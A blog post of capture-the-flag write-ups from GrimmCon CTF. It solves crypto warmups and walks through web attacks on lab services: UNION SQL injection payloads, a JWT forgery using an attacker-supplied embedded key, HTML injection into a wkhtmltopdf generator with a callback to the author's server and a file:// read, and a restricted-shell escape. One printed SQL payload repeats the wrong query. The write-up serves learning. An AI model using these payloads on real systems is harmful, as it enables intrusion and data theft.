---
title:  "GrimmCon CTF - Writeups"
date:   2021-01-02 02:01:25 +0100
categories: ctf
published: true
---

Who doesn't get bored during lockdown? It's even harder when you take holidays and spend them at home. Luckily, I discovered [GrimmCon CTF](https://grimmcon.ctf.games/) which was really fun to play and kept me very busy for about 8 hours.

Below are my writeups from challenges I solved during the CTF as well as a challenge (`Ticket Free`) which I *almost* solved during the ctf, I was literally seconds too slow to enter the flag into the submission form ... well, happens...

Depending on how long the challenges are still up and running I might take another look at `Lucky Numbers` which caused my worst rabbit hole during the CTF - I still have no clue how to solve that challenge...

## Chef's Salad (Warmups - Easy)

**Challenge description:**

```text
Author: @Blacknote#1337

Want to try the chef's salad? Some days it is it waldorf, some days fruit, some days caesar... it is different every day!

Download the file below.
Attachments: chefs_salad.txt
```

`chefs_salad.txt` is a text file with the following content:

```text
Tikv ny rdce n refd uiz qhmqnh hxfxcy ouoab, aika wnu nhewtll czyrhwyey. Caoc it bszx nukr: taqx{u6953087bc5hi8l207q2pts86uxz34a8}
```

The structure with the open curly brace and 4 letters before that look like the flag and indicate that the "encryption" is just some sort of letter shifting. 

I tried ROT13 using [CyberChef](https://gchq.github.io/CyberChef/) first and shifted until the first letter of the potential flag equals `f`. The result looked as follows:

```text
uwh zk dpoq z dqrp gul ctyczt tjrjok agamn, muwm izg ztqifxx olkdtikqk. Omao uf nelj zgwd: fmcj{g6953087no5tu8x207c2bfe86gjl34m8}
```

I noticed that `fmcj` does not yet equal `flag`, but shifting one more letter for each position would exactly result in the word `flag`.

After some trial and error (I tried to shift the numbers as well, which gave me a valid text but a flag that was not accepted by the submission system) I solved the challenge with the following Python script, only shifting upper- and lowercase letters with an incremental offset:

```python
import string

enc = "Tikv ny rdce n refd uiz qhmqnh hxfxcy ouoab, aika wnu nhewtll czyrhwyey. Caoc it bszx nukr: taqx{u6953087bc5hi8l207q2pts86uxz34a8}"

res = ""
shift = 0
for l in enc:
    if l in string.ascii_uppercase:
        res += string.ascii_uppercase[(string.ascii_uppercase.index(l) - shift) % len(string.ascii_uppercase)]
    elif l in string.ascii_lowercase:
        res += string.ascii_lowercase[(string.ascii_lowercase.index(l) - shift) % len(string.ascii_lowercase)]
    else:
        res += l
    shift += 1

print(res)
```

Running the script produces the following output with a valid flag:

```bash
$ python3 decode.py
This is just a cool and simple crypto chall, hope you learned something. Here is your flag: flag{b6953087aa5dd8e207f2cfd86cef34d8}
```

## Triple (Warmups - Easy)

**Challenge description:**

```text
Author: @trevor#1933

I was studying something called ASCII armor because I wanted to become better at encoding. I was having fun until I realized I couldn't decode my message... 

Download the file below.
Attachments: encoded.txt
```

`encoded.txt` is a text file with the following content:

```text
Ulc1amIyUnBibWNnWVNCdFpYTnpZV2RsSUdseklHRWdiRzkwSUc5bUlHWjFiaUIxYm5ScGJDQnBkQ0JwYzI0bmRDNGc= V20xNGFGb3pjM3BQVkd0M1RsZFJlVTFVVVRSYWFsSnRXa2RKTTFscVFYbE9WMDE1VFRKUk1rOUVVWGROUkU1cVdXNHdQUT09
```

The first string ends with a `=` and has only alphanumeric characters, this indicates that it might be base64 encoded. However, the result needed to be base64-decoded once again to get the plaintext string:

```bash
$ cat encoded.txt | sed "s/ /\n/g" | head -1 | base64 -d | base64 -d
Encoding a message is a lot of fun until it isn't.
```

The second word is three times base64-encoded and contains the flag:

```bash
$ cat encoded.txt | sed "s/ /\n/g" | tail -1 | base64 -d | base64 -d | base64 -d
flag{39905d2148f4fdb7b025c23d684003cb}
```

## Zip Zip (Warmups - Easy)

**Challenge description:**

```text
Author: @trevor#1933

My friend sent me this zip file... He is a prankster and compressed the file a LOT of times...

I don't know how to make this go quickly and I don't have the time... At least he told me the password is "pass".

Can you please help? 

Download the file below.
Attachments: 50.zip
```

The challenge consists of a zip archive called `50.zip` which can be unzipped with the password `pass` as described and contains another zip archive called `49.zip`. Once again, the same password works for unzipping `48.zip`.

As suggested by the challenge description, retrieving the flag should be automated because unzipping a file 50 times by hand is not funny.

This can be easily done with the following bash oneliner and `7z`:

```bash
$ for i in {50..00}; do 7z x $i.zip -ppass; done
```

Running this finally unzips `00.zip` which contains `flag.txt`:

```text
$ cat flag.txt
flag{cf97382071cb149aac8d6ab8baeaa3ee}
```

## Lottery (Web - Easy)

**Challenge Description**

```text
Author: @JohnHammond#6971

Did you win the lottery? Find out online!

Connect with: http://challenge.ctf.games:<port>
```

When visiting that URL, the site wants us to enter our lottery number:

{% include image-center.html url="/assets/grimmconctf/lottery.png" alt="Lottery" %}

The HTTP response header `X-Powered-By: PHP/7.0.33` tells us that the website was probably written in PHP. The default index file that was served when visiting that URL seems to be `index.php`, because opening `http://challenge.ctf.games:31685/index.php` shows the same page.

Furthermore, looking at the HTML source reveals the following HTML comment:

```html
<!-- proudly developed in GNU nano, the omnipotent IDE -->
```

When opening a file in a text editor such as `vim`, `emacs` or `nano`, a swap file is created as a backup of all changes made so far. This allows restoring unsaved changes in case of a system crash.

After trying out typical backup file endings such as `.swp`, I found out that `index.php~` exists on the server. As this file does not have a PHP file extension, the webserver serves it as text file, allowing us to view the PHP sourcecode as well:

```php
<?php
require("flag.php");

if (isset($_REQUEST['lottery_number'])){
	$lottery_number = $_REQUEST['lottery_number'];
	if ($lottery_number==""){

		echo '<div class="alert alert-danger" role="alert"><b>Whoops!</b> Enter your lottery number to see if you won!</div>';
	}else{      
		if ( preg_match("/^94519372＄/", $lottery_number) ){
			echo '<div class="alert alert-success" role="alert"><b>Congratulations!</b> You won! <code>' . $flag . '</code></div>';

		}else{
			echo '<div class="alert alert-warning" role="alert"><b>Oh no!</b> We are sorry. You did not win the lottery this time around!</div>';
		}
	}
}else{
?>
```

The check if the lottery number is correct is made with `preg_match` and seems to be pretty static. First, I tried to enter `94519372` which failed, but then I realized that spacing around the `$` in the regex looks weird. Indeed, it is a unicode character (U+FF04 - Fullwidth Dollar Sign) instead of a simple ASCII `$` sign. While the ASCII `$` sign marks the end of a regex, a unicode sign is just another character that needs to match.

Therefore, entering `94519372＄` (or any string starting with this) is a match an reveals the flag:

{% include image-center.html url="/assets/grimmconctf/lottery-flag.png" alt="Lottery - Flag" %}


## Syringe (Web - Easy)

**Challenge description**

```text
Author: @JohnHammond#6971

Doctors love their databases! Here is a library of words and semantics relating to medical words, like "syringe", or "x-ray", or "injection". Find whatever you need, just by searching for it!

Connect with: http://challenge.ctf.games:<port>
```

The website allows to search for semantics related to medical words. According to the challenge description, the words are stored in a database. The query issued via the input field also matches substrings in the middle of the results, indicating that the user input is placed in a `LIKE` query:

{% include image-center.html url="/assets/grimmconctf/syringe.png" alt="Syringe" %}

A comment in the HTML indicates that the SQL query is printed out if the `GET` parameter `debug` is set:

```html
<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
```

Let's try this by modifying a request intercepted with BurpSuite:

```html
POST /?debug=true HTTP/1.1
Host: challenge.ctf.games:32177
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 8

name=rea
```

The response contains the following output:

```html
<pre>
Words returned are:

breathe
breathing
reaction
treat
treatment

<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
SELECT * FROM semantics WHERE name LIKE "%rea%";</pre>
```

It is possible to output additional rows with 1 column of datatype string via a `UNION` query. I got the database schemata with the following payload in the `name` parameter:

```sql
" and 1=0 union select schema_name from information_schema.schemata -- -
```

From the results, only the schema `syringe` looks interesting because the other three schemata are part of a mysql standard installation:

```html
<pre>
Words returned are:

information_schema
mysql
performance_schema
syringe

<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
SELECT * FROM semantics WHERE name LIKE "%" and 1=0 union select schema_name from information_schema.schemata -- -%";</pre>
```

Then I got all tables from the schema `syringe` by using the following payload:

```sql
" and 1=0 union select schema_name from information_schema.schemata -- -
```

Of course, we want to query the `flag` table, the table `semantics` contains the words that are displayed to us anyway:

```html
<pre>
Words returned are:

flag
semantics

<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
SELECT * FROM semantics WHERE name LIKE "%" and 1=0 union select table_name from information_schema.tables where table_schema = "syringe" -- -%";</pre>
```

Finally, i got all columns of the `flag` table as follows:

```sql
" and 1=0 union select column_name from information_schema.columns where table_schema = "syringe" and table_name = "flag" -- -
```

The only columns in the table `flag` is named `flag` as well:

```html
<pre>
Words returned are:

flag

<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
SELECT * FROM semantics WHERE name LIKE "%" and 1=0 union select column_name from information_schema.columns where table_schema = "syringe" and table_name = "flag" -- -%";</pre>
```

Finally, the flag could be retrieved using the following payload:

```sql
" and 1=0 union select flag from flag -- -
```

Result:

```html
<pre>
Words returned are:

flag{f2a5006b1b07cc08362772807322ef62}

<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
SELECT * FROM semantics WHERE name LIKE "%" and 1=0 union select flag from flag -- -%";</pre>
```


## Bake The World (Web - Medium)

**Challenge description**

```text
Author: @congon4tor#2334

We had a vulnerability in a legacy service. We implemented a proxy to sanitize a parameter.

Connect with: http://challenge.ctf.games:<port>
```

The website contains recipes for cakes and cookies. One can either filter the recipes by category by using the `GET` parameter `category` with value `Cakes` or `Cookies` or perform a full-text search by using the `GET` parameter `search`. When clicking on an individual item, the recipe ID is added to the URL and the page displays the whole recipe:

{% include image-center.html url="/assets/grimmconctf/baketheworld.png" alt="Bake The World" %}

I first tried to use SQL injection in the search box and the category name but that did not work. Finally, I tried to manipulate the ID in the URL and noticed something interesting: if the ID was not found, the input was reflected on the 404 page.

When trying to inject a payload with double quotes, the input was reflected as-is:

{% include image-center.html url="/assets/grimmconctf/baketheworld_notfound_doublequote.png" alt="Bake The World - Double Quote" %}

However, when trying to inject a payload with single quotes, the single quote got stripped:

{% include image-center.html url="/assets/grimmconctf/baketheworld_notfound_singlequote.png" alt="Bake The World - Single Quote" %}

The challenge description mentions a proxy that is used for sanitizing parameters due to a vulnerability in a legacy service. Possible, the payload must contain single quotes which are filtered out by the proxy.

Next, I tried to get the single-quote working, which was possible when encoding the single-quote twice (`%2527`). When trying to put together a POC with MySQL's `sleep()` function, I got additional error output indicating that an `SQLITE` database is used, and, even better, the SQL statement was revealed as well:

```http
GET /post/0%2527%20or%20sleep(10)--%20 HTTP/1.1
Host: challenge.ctf.games:30434
Connection: close
```

Response:

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/1.0.1 Python/3.8.7
Date: Wed, 30 Dec 2020 19:24:36 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>(sqlite3.OperationalError) no such function: sleep<br>[SQL: select * from post where id = '0' or sleep(10)-- ']<br>(Background on this error at: http://sqlalche.me/e/13/e3q8)</p>
```

Great - but we need to find out where the flag can be found. We probably can output data via `UNION`, therefore, I first needed to find out how many columns are needed, as the number of columns in the query appended via `UNION` needs to be equal to the results of the first query. Therefore, I just tried to append columns with `NULL` values while I got error messages...

```http
GET /post/0%2527%20union%20select%20null,null,null,null,null,null,null,null%20--%20- HTTP/1.1
Host: challenge.ctf.games:31019
Connection: close
```

Response:

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 393
Server: Werkzeug/1.0.1 Python/3.8.7
Date: Fri, 01 Jan 2021 22:21:13 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>(sqlite3.OperationalError) SELECTs to the left and right of UNION do not have the same number of result columns<br>[SQL: select * from post where id = '0' union select null,null,null,null,null,null,null,null -- -']<br>(Background on this error at: http://sqlalche.me/e/13/e3q8)</p>
```

... until the following query returned a 200 OK and a recipe with some Null values:

```http
GET /post/0%2527%20union%20select%20null,null,null,null,null,null,null,null,null%20--%20- HTTP/1.1
Host: challenge.ctf.games:31019
Connection: close
```

This means that the initial query returns 9 columns.

When using the 2nd and 3rd value, the output of the appended statement can be found inside the resulting HTML. During the CTF, I just found out the column name via `sqlite_master`, because I could not print the SQL query directly out of some reason. After the CTF, I found out how to print column names and table names with an SQLITE statement instead of using `.describe [TABLENAME]` (which I tend to use when directly connecting to sqlite databases):

```sql
select m.name as column, p.name as row from sqlite_master m left outer join pragma_table_info((m.name)) p on m.name=p.name;
```

This statement needs to be adapted a bit, included into the `UNION` query and every single-quote needs to be URL-encoded twice. Sending the following `GET` request returns all table names and column names:

```http
GET /post/0%2527%20union%20select%201,(%2527table:%20%2527%20||%20m.name),(%2527column:%20%2527%20||%20p.name),null,null,null,null,null,null%20from%20sqlite_master%20m%20left%20outer%20join%20pragma_table_info((m.name))%20p%20on%20m.name%3dp.name%20--%20- HTTP/1.1
Host: challenge.ctf.games:31019
Connection: close
```

In this case, the output could be found in the title and author fields in the HTTP response:

```html
<!-- Title -->
<h1 class="mt-4">table: flag</h1>

<!-- Author -->
<p class="lead">
	by
	<a href="#" class="">column: flag</a>
</p>
```

Finally, I got the flag with the following request:

```html
GET /post/0%2527%20union%20select%20null,flag,null,null,null,null,null,null,null%20from%20flag%20--%20- HTTP/1.1
Host: challenge.ctf.games:31019
Connection: close
```

The response contains the flag as expected:

```html
<!-- Title -->
<h1 class="mt-4">flag{c9e8f379eae24135eab77d82a5a80c46}</h1>
```


## Keys To The Castle (Web - Medium)

**Challenge description**

```
Author: @congon4tor#2334

Are you the king of the castle? Did you get locked out? 

Connect with: http://challenge.ctf.games:<port>
```

The website allows users to login by choosing a username:

{% include image-center.html url="/assets/grimmconctf/keystothecastle.png" alt="Keys to the Castle" %}

Logging in as user `test` shows the following message: `You are logged in as test - Only the admin has the keys to the castle`. Trying to login as user `admin` does not work, the error message `Logging in as the admin has been disabled` gets displayed.

Therefore I logged in as user `test` again and proxied the traffic through burp for analyzing how the authentication is implemented. I noticed the following cookie being set when logging in:

```text
Set-Cookie: keys=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJ1c2UiOiJzaWciLCJraWQiOiJrZXktMSIsImFsZyI6IlJTMjU2IiwiZSI6IkFRQUIiLCJuIjoiQU1HdENyUV94RzAzY3dOTDhJTFBHRzcySWxGN2MxTmI2ckVQbTN2bnU4S0VuNlRndDBhM3RtaWpIMTBzYlJIbFAyVFd1OFdaV05wREhHSEMzbVpjcTZrU0dYbk0xdFlKX0syMnpscEY4VW9HUHdJOTdjQktTQTIxNFpVR3NyelRKa1ZQV3BIMDlqNVF6dGRwaTEzNFZjNFNEVXRqb1hGMHFSNmJNazNVN2I0a05DV1Vwa0k1RkJEaWZaWHZVNVgzeWc4V2NodGZ1T18wRnhJN21xTFk5eTN1MTFfTW5uYS1Sd2o3T0ZFaFVJTDI0V2FWMGlwcm5mWmxnbGEwSEZhUjE2anZmam5iMXJyRGt4empQUnZoZUJCazkyaTl3MFFJR1FwUnEyX0EyeVkya0JQMXcwLXFJNk8yV1lDY1lEa0lyX1poTVBWOE1UaGZoMjNkME03MUtGRSJ9LCJraWQiOiJrZXktMSJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.MdwBQVSASKNn9924chBHdKacb6McnoK4tV7s1ErRu3aYCQnf86ncu3LiscYNJbFle5ZfiMcpyl9nRxybtqOQ7UNX36LcJGnZ6vYuVxImcKS707t3dxcN2wuOFNyyefqFBJUVGmK0S-bskyJB4qN0kH-ItofOcMD5ASO8A9ebzdxl39yQv5JONTtPvSb5rg6HGRSrrrmEiIPE_mYsJ08lWrQi-4-qV4182Hf_q_Z5v4-kZiUBAADyyHzCR7lP5cq7pHN_S6PbPv1J-13c3xYfN7lc-CExXcd3urPrM0GnmTASChWmhSz-db7WKfPubYMVITv4mXRFrGAHs4rUWGeELw
```

This looks like a JWT token, because we can see 3 base64-encoded strings separated by dots.

The first part of the JWT token, the header, decodes to the following JSON data:

```json
{"typ":"JWT","alg":"RS256","jwk":{"kty":"RSA","use":"sig","kid":"key-1","alg":"RS256","e":"AQAB","n":"AMGtCrQ_xG03cwNL8ILPGG72IlF7c1Nb6rEPm3vnu8KEn6Tgt0a3tmijH10sbRHlP2TWu8WZWNpDHGHC3mZcq6kSGXnM1tYJ_K22zlpF8UoGPwI97cBKSA214ZUGsrzTJkVPWpH09j5Qztdpi134Vc4SDUtjoXF0qR6bMk3U7b4kNCWUpkI5FBDifZXvU5X3yg8WchtfuO_0FxI7mqLY9y3u11_Mnna-Rwj7OFEhUIL24WaV0iprnfZlgla0HFaR16jvfjnb1rrDkxzjPRvheBBk92i9w0QIGQpRq2_A2yY2kBP1w0-qI6O2WYCcYDkIr_ZhMPV8MThfh23d0M71KFE"},"kid":"key-1"}
```

The second part of the JWT token, the payload, just contains the following data:

```json
{"username":"test"}
```

Looking at the header made me notice that RSA is used as signature algorithm (`RS256`) and the public parameters of the RSA key (`e` and `n`) are included in the JWT header. When generating a signature using RSA, the private key (parameter `d`) is needed as well, which we do not know. However, for signature verification, only the public parameters are needed. This means that if the server accepts any key submitted in the JWT header and uses it for checking the signature, we can forge a JWT token with a newly generated key that we own. In order to become admin, we probably need to forge a JWT token with the username set to `admin`.

I was too lazy to script the key generation myself and used two websites, one for key generation and one for token manipulation, in order to be more time-efficient:

### 1. Key Generation

For generating a new keypair with the key parameters already converted to the correct format, I used [mkjwk](https://mkjwk.org/) with the following parameters:

* Key size: 2048
* Key use: signature
* Algorithm: RS256
* Key id: test
* Show X509: yes

I stored the private key in PEM format and the public key parameters because they are needed for token manipulation.

### 2. Token manipulation

For manipulating a given JWT token, I used [jwt.io](https://jwt.io). I copy-pasted a token issued by the application into the token field, switched the `jwk` parameter in the header, set the `kid` parameter to `test` to match the `kid` of the generated token, set the payload to `{"username": "admin"}` and pasted the private key from the previous step into the private key field.

The manipulated token looked as follows:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6InRlc3QiLCJhbGciOiJSUzI1NiIsIm4iOiI0UzBoWUpfcVRvc2lndHU1SUVMZkcyWUZUZ0toWENpdGxVOGcyMTNxblNHTmFuS1hBUVBpRU4yUkhHd3haV05kYVdhMmQ3NTVZeDA0TTBzUG0wM1JSZWpZOTBxSC1wN3oxWml3TUJqT1NqSXloLTk2UW9TMC1fYjdYLTBEWGFobU9adHFrY2ZZOTZZWHhxOVFNTTh6TzR4Qy1CWk5CM2pLMXdseVZmWDRvdGJSWEFCNEJnTl9qelotVWtCV2k4dUxGLWRxNnA5V190cU1zZmRkRWFfOW5GbEtZWGNnOENWY0F6X0R0bEpLSUctc2F0bkdWekpzZFFVOURod2NTNlBCMm9rWWRLaEZTZl9Ka1VxdkJ4eFA0T3ZhUmlkN1R5Q2xTd25NWDVjdHlhamw4Q3N3RV9nd2d1aWZWSDdFX3o4bjViMENab2dvZ2VqaWQxeWtnb3hoNncifSwia2lkIjoidGVzdCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SeXENYojkcXGEdnU1qle_glRBf9kkhJhJDu4wYxr_BrmFAzXnBivoEULKPXgYDnscZORK1pO-Ax0A_vBZVlHzZBR8JU5o_z4g0c6U90K8fjpV-bZ7lsBHe90mb63KVGK2d_qzgf104nQjiEi-29WAt1uqCajw1ExGS_KqGp45tjLqXoCxHLEJaayO0LRHEDEcVuDXvhoRDML93fs1YrJ3F4x24t_jCJzoHv6nbgW1s8pySP5dFUSrkkVbSuzc8QcBjHWkp98hhHIPHwbXDBVX4GZXMjRE2VN4GDvckxW7tGLy4zBl3wQBOyCfNmHyFqQhikV7Meyz3PMcsWx7YvNYg
```

Header:

```json
{"typ":"JWT","alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","use":"sig","kid":"test","alg":"RS256","n":"4S0hYJ_qTosigtu5IELfG2YFTgKhXCitlU8g213qnSGNanKXAQPiEN2RHGwxZWNdaWa2d755Yx04M0sPm03RRejY90qH-p7z1ZiwMBjOSjIyh-96QoS0-_b7X-0DXahmOZtqkcfY96YXxq9QMM8zO4xC-BZNB3jK1wlyVfX4otbRXAB4BgN_jzZ-UkBWi8uLF-dq6p9W_tqMsfddEa_9nFlKYXcg8CVcAz_DtlJKIG-satnGVzJsdQU9DhwcS6PB2okYdKhFSf_JkUqvBxxP4OvaRid7TyClSwnMX5ctyajl8CswE_gwguifVH7E_z8n5b0CZogogejid1ykgoxh6w"},"kid":"test"}
```

Payload:

```json
{"username":"admin"}
```

The JWT token can now be simply set in the web browser, when refreshing the page, one is logged in as admin and therefore can see the flag:

{% include image-center.html url="/assets/grimmconctf/keystothecastle-flag.png" alt="Keys to the Castle - Flag" %}


## fruitify (Web - Medium)

**Challenge description**

```
Author: @congon4tor#2334

Come grab a tasty freshly made juice, they are delicious

Connect with: http://challenge.ctf.games:<port>
```

This page is all about smoothies.

{% include image-center.html url="/assets/grimmconctf/fruitify.png" alt="Fruitify" %}

One can click on one of the entries displayed in the overview to see a detailed description as well as a list of a smoothie's ingredients.

When looking at the HTTP traffic in BurpSuite, I noticed that a `POST` request to `/graphql` is made when clicking on an item and opening the detail view. The following HTTP request gets submitted:

```http
POST /graphql HTTP/1.1
Host: challenge.ctf.games:30610
content-type: application/json
Content-Length: 244
Connection: close

{"operationName":"JuiceQuery","variables":{"id":"1"},"query":"query JuiceQuery($id: Int!) {\n  juice(id: $id) {\n    name\n    image\n    method\n    ingredients {\n      name\n      quantity\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

This request contains a graphql query.

First, I got the name of all types and all fields as follows:

```http
POST /graphql HTTP/1.1
Host: challenge.ctf.games:31498
content-type: application/json
Content-Length: 117
Connection: close

{
	"operationName":"JuiceQuery",
	"variables":{"id":"1"},
	"query":"query JuiceQuery {__schema{types{name,fields{name}}}}"
}
```

The response contains quite a lot of data:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Fri, 01 Jan 2021 23:50:28 GMT
Content-Length: 1331
Connection: close

{"data":{"__schema":{"types":[{"fields":null,"name":"Int"},{"fields":[{"name":"defaultValue"},{"name":"description"},{"name":"name"},{"name":"type"}],"name":"__InputValue"},{"fields":[{"name":"args"},{"name":"deprecationReason"},{"name":"description"},{"name":"isDeprecated"},{"name":"name"},{"name":"type"}],"name":"__Field"},{"fields":null,"name":"__DirectiveLocation"},{"fields":[{"name":"id"},{"name":"image"},{"name":"ingredients"},{"name":"method"},{"name":"name"}],"name":"Juice"},{"fields":null,"name":"String"},{"fields":[{"name":"description"},{"name":"enumValues"},{"name":"fields"},{"name":"inputFields"},{"name":"interfaces"},{"name":"kind"},{"name":"name"},{"name":"ofType"},{"name":"possibleTypes"}],"name":"__Type"},{"fields":null,"name":"__TypeKind"},{"fields":null,"name":"Boolean"},{"fields":[{"name":"deprecationReason"},{"name":"description"},{"name":"isDeprecated"},{"name":"name"}],"name":"__EnumValue"},{"fields":[{"name":"flag"},{"name":"juice"},{"name":"juices"}],"name":"Query"},{"fields":[{"name":"name"},{"name":"quantity"}],"name":"Ingredient"},{"fields":[{"name":"directives"},{"name":"mutationType"},{"name":"queryType"},{"name":"subscriptionType"},{"name":"types"}],"name":"__Schema"},{"fields":[{"name":"args"},{"name":"description"},{"name":"locations"},{"name":"name"}],"name":"__Directive"}]}}}
```

When looking closer, there seems to be a field named `flag` in the `Query` type.

The flag could simply be retrieved by issuing the following POST request:

```
POST /graphql HTTP/1.1
Host: challenge.ctf.games:31498
content-type: application/json
Content-Length: 32
Connection: close

{"query":"query Query { flag }"}
```

Response containing the flag:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Fri, 01 Jan 2021 23:57:00 GMT
Content-Length: 58
Connection: close

{"data":{"flag":"flag{5e4e716b08873b04ed7ee8c2d88a5a2e}"}}
```

## Ticket Free (Web - Hard)

*Challenge description*

```text
Author: @congon4tor#2334

Check out all the upcoming event. All tickets are free

Connect with: http://challenge.ctf.games:<port>
```

This website allows booking tickets for various events. When booking a ticket, one can input a ticket name and an e-mail address:

{% include image-center.html url="/assets/grimmconctf/ticketfree.png" alt="Ticketfree" %}

After filling out those fields and clicking on `BOOK TICKET`, a PDF gets generated which is the ticket for an event. The PDF contains name and e-mail address that were entered.

PDF generators might vulnerable to XSS, if user input is directly included into the final PDF. The e-mail address field needs to be a valid e-mail address, but the `name` field can contain arbitrary input with special characters, therefore, I focused on injecting into the `name` field. I first tried to enter `<i>MyName</i>`. The generated PDF contained the name in Italic which means that we can at least inject HTML.

Next, I tried to inject an `img` tag with a URL pointing to my VPS: `<img src="http://[myvps]:9999/asdf">` - and got an incoming HTTP request:

```text
$ nc -nlvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 34.121.198.254 47390 received!
GET /asdf HTTP/1.1
Origin: file://
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: [myvps]:9999
```

The request headers tell us:
* the external IP address of the server: 34.121.198.254
* The PDF generator `wkhtmltopdf` is used, which generates PDFs from HTML
* The origin is `file://`, which means that we probably can use `file://` URLs to retrieve local files

During the CTF, I wasted a lot of time trying to retrieve `/etc/passwd`. At the end, I simply tried to guess the name and location of the flag file. This finally worked with the following payload: `<iframe src="file:///flag.txt" width=500 height=500></iframe>`:

{% include image-center.html url="/assets/grimmconctf/ticketfree-flag.png" alt="Ticketfree" %}


## Environmentalist (Miscellaneous - Medium)

*Challenge description*

```text
Author: @JohnHammond#6971

We're trying to have less of a carbon footprint... so now we only use one-letter commands in our bash shell! You can do your part to help save the environment!

nc challenge.ctf.games <port>
```

When connecting to the server as instructed, we are greeted with the following text:

```text
$ nc challenge.ctf.games 30767
We're trying to have less of a carbon footprint...
so now we only use one-letter commands in our bash shell!
Here's a directory listing so you don't need `ls` :)

environmentalist.sh
get_flag.sh
```

After trying to find a way to issue commands with a single letter, I gave up because nothing came to my mind that could work and tried to enter all letters of the alphabet. `a` and `b` gave me some text output, `c` resulted in `/home/challenge/environmentalist.sh: line 50: c: command not found`. When I came to `s`, the script itself was printed to stdout:

```bash
#!/bin/bash

echo "We're trying to have less of a carbon footprint..."
echo 'so now we only use one-letter commands in our bash shell!'
echo "Here's a directory listing so you don't need \`ls\` :)"
echo ""
ls

function a(){
    echo "Ayyyyy! :)"
}

function x(){
    /usr/bin/env
}

function s(){
    cat `basename "$0"`
}

function b(){
    echo 'Bees are good for the environment!'
}

export -f x
export -f b

function count_slash(){
    echo $1|grep -o "/"|wc -l
}
function count_dot(){
    echo $1|grep -o "."|wc -l
}
function count_x(){
    echo $1|grep -o "x"|wc -l
}

while true; do
    read -p "> " input
    if echo -n "$input"| grep -v -E "^[./ ?xabcs]*$" ;then
        echo "Sorry, to make less of a carbon-footprint, we are only accepting one-letter commands."
    else
        dots=$(count_dot $input)
        slashs=$(count_slash $input)
        exes=$(count_x $input)

        if [[ $dots -gt 2 || $slashs -gt 1 || $exes -gt 1 ]]; then
            echo "Hey now! That is bad for the environment!"
        else
            eval "$input"
        fi
    fi
done
```

This gave me the possibility to debug the script locally in order to find out how to execute `get_flag.sh` which is probably the goal (I placed a `get_flag.sh` file into the same directory). 

Besides the functions I already discovered, there is also `x` which prints all environment variables. Executing it on the server gave the following results:

```bash
x
PWD=/home/challenge
SHLVL=1
BASH_FUNC_b%%=() {  echo 'Bees are good for the environment!'
}
BASH_FUNC_x%%=() {  /usr/bin/env
}
_=/usr/bin/env
```

The goal is obviously to get through to the `eval "$input"` line, but before reaching that line, multiple checks need to be passed.

The character restrictions are checked as follows:

First, `echo -n "$input"| grep -v -E "^[./ ?xabcs]*$"` ensures that the command only contains the characters `.`, `/`, blank, `x`, `a`, `b`, `c` or `s`. This explains the `command not found` output when entering `c`: this string passes through until `eval` but `c` is neither found inside `$PATH` nor defined as a function in the script.

Afterwards, the length restrictions are checked in the functions 
* `count_dot`, which counts all characters (not literally `.` because `grep` treats that as regex) 
* `count_slash`, which counts all `/` characters
* `count_x`, which counts all `x` characters

This means that only strings with two characters, containing not more than a single `/` and / or a single `x`, are allowed and passed to `eval`.

This looks pretty safe at first glance, but there is a bug in the script: The first check allows blanks in `$input`, but in the function calls for the `count_*` functions, `$input` is not quoted. Inside those functions, only the first function parameter (`$1`) is checked. Therefore, we can use commands of arbitrary length as long as the part before the blanks passes the `count_*` checks and the input only contains allowed characters.

In Bash, wildcards can be used which are expanded to matching strings before a command is executed. E.g., running `/usr/bin/ls` can also be done by running `/u*/b??/ls`, as long as the first match is the expected command. The wildcard `*` is more commonly known, it replaces an arbitrary amount of characters, but there is also the wildcard `?` that can replace exactly one character. As `?` is in the list of allowed characters, we can bypass the character restrictions and execute `get_flag.sh` by replacing it with e.g. `??????a????`.

We still need a command that does not exceed the length limitations before the first blank and that executes a given file specified as parameter. The `.` command is a perfect fit - it executes commands from a file in the current shell and takes a filename as parameter.

This means we can execute `get_flag.sh` as follows:

```bash
. ??????a????
Did you know, flags are good for the environment too?
``` 

Well, this does look like it succeeded but it did not print the flag. However, maybe the flag is written into an environment variable? When printing the environment again, the flag is indeed present:

```bash
x
PWD=/home/challenge
FLAG=flag{ce55bd569a4074d01eefa0b72e0cfc3b}
SHLVL=1
BASH_FUNC_b%%=() {  echo 'Bees are good for the environment!'
}
BASH_FUNC_x%%=() {  /usr/bin/env
}
_=/usr/bin/env
```
